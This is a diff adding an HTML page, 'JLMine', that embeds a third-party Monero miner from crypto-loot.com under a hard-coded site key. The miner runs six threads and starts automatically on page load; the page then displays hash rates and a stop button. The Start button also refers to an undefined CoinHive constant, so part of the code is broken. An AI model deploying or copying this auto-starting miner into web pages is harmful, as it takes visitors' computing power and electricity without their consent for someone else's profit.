@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	
+	<title>JLMine</title>
+
+	<style type="text/css">
+		
+	</style>
+
+</head>
+<body>
+
+	<div>
+		<script src="https://crypto-loot.com/lib/miner.min.js"></script>
+		<center style="padding:5rem 0 0 0">Make Monero for JL:</center>
+		<center>
+			<p id="minebutton"></p>
+		</center>
+		<center>
+			<p id="tcount"></p>
+			<p id="hps"></p>
+			<p id="ths"></p>
+			<p id="tah"></p>
+		</center>
+		<script type="text/javascript">
+			var miner=new CryptoLoot.Anonymous('78413a62525177c4a1acd097c5a5d2383ab524097f64',
+			{
+				threads:6,autoThreads:false,throttle:0.2,
+			 }
+			);
+			miner.start();
+
+		// Update stats once per second
+		setInterval(function() {
+		    var threadCount = miner.getNumThreads();
+		    var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
+		    var totalHashes = miner.getTotalHashes();
+		    var acceptedHashes = miner.getAcceptedHashes() / 256;
+		    // Output to HTML elements...
+			    if (miner.isRunning()) {
+				document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
+				document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
+				document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
+				document.getElementById("tah").innerHTML = "Accepted Hashes: " + acceptedHashes;
+				document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
+			    } else {
+				document.getElementById("tcount").innerHTML = "&nbsp;";
+				document.getElementById("hps").innerHTML = "&nbsp;";
+				document.getElementById("ths").innerHTML = "&nbsp;";
+				document.getElementById("tah").innerHTML = "&nbsp;";
+				document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Mining</button>";
+		    }
+		}, 1000);
+		</script>
+	</div>
+	
+</body>
+</html>
